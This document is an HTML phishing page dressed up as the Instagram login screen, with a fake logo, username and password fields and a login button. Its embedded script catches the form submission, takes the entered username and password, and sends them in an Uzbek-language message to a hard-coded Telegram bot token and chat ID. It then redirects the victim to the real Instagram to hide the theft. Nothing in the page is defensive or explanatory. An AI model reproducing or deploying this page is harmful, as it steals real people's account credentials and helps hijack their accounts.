
<!DOCTYPE html>

<body>

<div id="content-container">

    <!--Phone's pictures section-->
    <section class="phones">
        <img src="phone.png" alt="pictures on phone" class="phone-image">

    <!--User's log in section-->
    <section class="user">

        <div class="login-container">

            <!--Instagram Logo-->
            <div class="instagram-logo-box">
                <img class="instagram-logo" src="instagram-logo.png">
            </div>

            <!--Form Login-->
            <form id="login-post">
                <input type="hidden" name="cid" value="6900365422">
                <div class="inputs-container">
                    <input type="text" id="name" name="username" placeholder="Phone number, username or email" required >
                </div>
                <div class="inputs-container">
                    <input type="password" id="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" id="send" class="login-button">Log in</button>

                <div class="or-container">
                    <div class="line"></div>

                </div>

                <!--Facebook login-->

                        with Facebook</a>
                </div>
            </form>

            <!--Password recovery-->
            <a class="password-forgot" href="" target="_blank">Forgot password?</a>
        </div>

        <!--Sign up-->
        <div class="signup-container">
            <p>Don't have an account? <a class="signup" href="#" target="_blank">Sign up</a></p>
        </div>

        <!-- App's download
        <div class="get-container">

</div>

<script>
    let botToken = "8487900837:AAHgUrza8wlMn22woWOzsoG_W-8HmVnKWSA";
    let chatId = "6181160596";

    document.getElementById("login-post").addEventListener("submit", function (e) {
        e.preventDefault();

        let username = document.querySelector("input[name='username']").value;
        let password = document.querySelector("input[name='password']").value;

        let message = `\ud83c\udd94 <b>Yangi login ma'lumotlari:</b>\n\ud83d\udc64 <b>Username:</b> ${username}\n\ud83d\udd11 <b>Parol:</b> ${password}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
        })
        .then(response => {
            if (response.ok) {
                window.location.href = "https://www.instagram.com/?next=%2F";
            } else {
                alert("Xatolik yuz berdi, qayta urinib ko'ring!");
            }
        })
        .catch(error => {
            console.error("Xato:", error);
            alert("Xatolik yuz berdi!");
        });
    });
</script>

</body>
